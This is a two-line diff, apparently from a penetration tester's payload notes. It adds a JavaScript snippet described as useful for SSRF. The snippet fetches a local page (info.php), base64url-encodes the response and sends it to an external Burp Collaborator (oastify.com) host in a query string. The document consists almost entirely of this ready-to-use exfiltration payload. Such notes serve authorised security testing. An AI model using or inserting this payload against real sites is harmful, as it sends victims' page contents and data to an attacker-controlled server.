@@ -1,0 +1,2 @@
+makes a request to a page (useful for SSRF) and then sends the contents of that to burp collaborator:
+fetch('info.php').then(response => response.text()).then(text => {const encodedData = btoa(text).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');return fetch(`http://o5uzp5erq4f6tayy2t05ps565xbozf23r.oastify.com/?data=${encodedData}`);}).then(response => response.text()).then(result => console.log(result));
